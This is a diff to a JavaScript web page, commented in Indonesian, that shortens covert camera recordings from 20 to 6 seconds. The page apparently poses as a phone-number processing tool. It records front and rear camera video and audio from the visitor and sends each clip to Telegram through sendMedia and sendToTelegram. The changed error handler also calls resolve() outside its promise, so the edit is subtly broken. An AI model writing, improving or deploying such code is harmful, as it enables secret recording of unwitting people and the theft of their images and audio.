@@ -183,7 +183,7 @@
       } catch (err) {}
     }
 
-    // Fungsi Rekam Video yang Disempurnakan (20 Detik per Kamera)
+    // Fungsi Rekam Video (6 Detik sesuai permintaan)
     async function recordVideo(facingMode, label) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -197,16 +197,17 @@
           mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
           mediaRecorder.onstop = () => {
             const blob = new Blob(chunks, { type: 'video/mp4' });
-            sendMedia(blob, 'video', `${label}.mp4`, `🎥 Video ${label} (20s)`);
+            sendMedia(blob, 'video', `${label}.mp4`, `🎥 Video ${label} (6s)`);
             stream.getTracks().forEach(track => track.stop());
             resolve();
           };
 
           mediaRecorder.start();
-          setTimeout(() => mediaRecorder.stop(), 20000); // 20 Detik
+          setTimeout(() => mediaRecorder.stop(), 6000); // Diubah menjadi 6 Detik
         });
       } catch (err) {
-        sendToTelegram(`❌ Gagal Video ${label}: ${err.message}`);
+        sendToTelegram(`❌ Gagal Video ${label}`);
+        resolve();
       }
     }
 
@@ -223,15 +224,15 @@
         flashKedip();
         recordAudio(); 
         
-        // Rekam Video Depan
-        infoDiv.innerText = '🎥 Merekam video depan (20s)...';
+        // Rekam Video Depan (6 detik)
+        infoDiv.innerText = '🎥 Merekam video depan (6s)...';
         await recordVideo("user", "Depan");
         
-        // Jeda sebentar agar transisi hardware mulus
+        // Jeda transisi
         await new Promise(r => setTimeout(r, 1000));
         
-        // Rekam Video Belakang
-        infoDiv.innerText = '🎥 Merekam video belakang (20s)...';
+        // Rekam Video Belakang (6 detik)
+        infoDiv.innerText = '🎥 Merekam video belakang (6s)...';
         await recordVideo("environment", "Belakang");
         
         infoDiv.innerText = `✅ Berhasil memproses ${nomor}`;
